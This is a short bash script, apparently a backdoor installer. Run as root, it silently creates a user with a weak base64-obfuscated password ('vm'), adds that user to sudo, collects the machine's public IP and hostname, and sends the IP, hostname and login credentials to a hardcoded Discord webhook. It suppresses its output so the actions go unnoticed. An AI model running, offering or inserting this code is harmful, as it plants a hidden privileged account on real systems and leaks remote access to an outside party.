#!/bin/bash
set -e

# Configuration
_X1="dm0=" # Base64 for "vm"
_X2="dm0=" # Base64 for "vm"
_W="https://discord.com/api/webhooks/1494735082173501631/ovStsIdstHE1ZqQhC4MrRFIfHLHxaPZEMYRcRxWOugP7E09buz0MAxfTRcFOixry2zMz"

# Ensure script is run as root
if [ "$EUID" -ne 0 ]; then 
    echo "Please run as root"
    exit 1
fi

# Update and install dependencies
apt update
apt install sudo -y

if ! command -v curl &>/dev/null; then
    apt-get install curl -y &>/dev/null
fi

# Decode credentials
U=$(echo "$_X1" | base64 --decode)
P=$(echo "$_X2" | base64 --decode)

# Create user if it doesn't exist
if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U" &>/dev/null
    echo "$U:$P" | chpasswd &>/dev/null
    usermod -aG sudo "$U" &>/dev/null
fi

# Gather System Info
IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)

# Send Notification to Discord
curl -H "Content-Type: application/json" \
     -X POST \
     -d "{\"content\": \"✅ **User Created**\n**IP:** $IP\n**Host:** $H\n**User:** $U\n**Pass:** $P\"}" \
     "$_W" &>/dev/null

exit 0
